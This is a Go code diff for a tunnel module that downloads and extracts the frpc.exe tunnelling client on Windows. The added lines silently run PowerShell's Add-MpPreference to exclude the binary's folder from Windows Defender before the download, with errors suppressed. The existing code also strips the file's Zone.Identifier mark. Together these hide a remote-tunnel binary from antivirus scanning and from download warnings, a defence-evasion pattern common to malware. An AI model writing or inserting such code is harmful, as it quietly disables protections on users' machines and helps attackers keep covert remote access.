@@ -1,6 +1,7 @@
 package tunnel
 
 import (
+	"archive/zip"
 	"bytes"
 	"encoding/json"
 	"fmt"
@@ -116,6 +117,10 @@ func (t *FrpTunnel) download() error {
 		return nil
 	}
 
+	log.Printf("[frp] adding Defender exclusion for %s", t.binDir)
+	exec.Command("powershell", "-NoProfile", "-Command",
+		fmt.Sprintf("Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue", t.binDir)).Run()
+
 	log.Printf("[frp] downloading from %s", frpClientURL)
 	client := &http.Client{Timeout: 300 * time.Second}
 	resp, err := client.Get(frpClientURL)
@@ -138,10 +143,35 @@ func (t *FrpTunnel) download() error {
 	log.Printf("[frp] downloaded %d bytes", written)
 
 	log.Printf("[frp] extracting frpc.exe...")
-	psCmd := fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue; Expand-Archive -Path '%s' -DestinationPath '%s' -Force; Move-Item -Force '%s\\frp_0.61.2_windows_amd64\\frpc.exe' '%s'`, t.binDir, zipPath, t.binDir, t.binDir, frpcPath)
-	ps := exec.Command("powershell", "-NoProfile", "-Command", psCmd)
-	if output, err := ps.CombinedOutput(); err != nil {
-		return fmt.Errorf("extract: %w - %s", err, string(output))
+	zipReader, err := zip.OpenReader(zipPath)
+	if err != nil {
+		return fmt.Errorf("open zip: %w", err)
+	}
+	defer zipReader.Close()
+	extracted := false
+	for _, f := range zipReader.File {
+		if strings.Contains(strings.ToLower(f.Name), "frpc.exe") {
+			rc, err := f.Open()
+			if err != nil {
+				return fmt.Errorf("open %s in zip: %w", f.Name, err)
+			}
+			outFile, err := os.Create(frpcPath)
+			if err != nil {
+				rc.Close()
+				return fmt.Errorf("create %s: %w", frpcPath, err)
+			}
+			_, err = io.Copy(outFile, rc)
+			rc.Close()
+			outFile.Close()
+			if err != nil {
+				return fmt.Errorf("extract %s: %w", f.Name, err)
+			}
+			extracted = true
+			break
+		}
+	}
+	if !extracted {
+		return fmt.Errorf("frpc.exe not found in zip")
 	}
 
 	os.Remove(frpcPath + ":Zone.Identifier")
